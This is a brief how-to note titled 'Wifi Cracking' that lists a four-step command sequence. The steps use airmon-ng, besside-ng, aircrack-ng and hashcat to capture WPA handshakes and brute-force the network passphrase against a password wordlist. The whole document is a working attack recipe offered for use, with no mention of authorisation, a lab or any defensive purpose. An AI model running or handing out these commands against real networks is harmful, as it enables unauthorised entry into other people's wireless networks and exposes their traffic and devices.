# Wifi Cracking

open a terminal and type
airmon-ng start wlan0

then
besside-ng wlan0

once besside has pwnd the required point
aircrack-ng /root/wpa.cap -j con

then
hashcat -m 2500 -a 3 /root/con.hccapx /usr/share/metasploit-framework/data/wordlists/password.lst --force

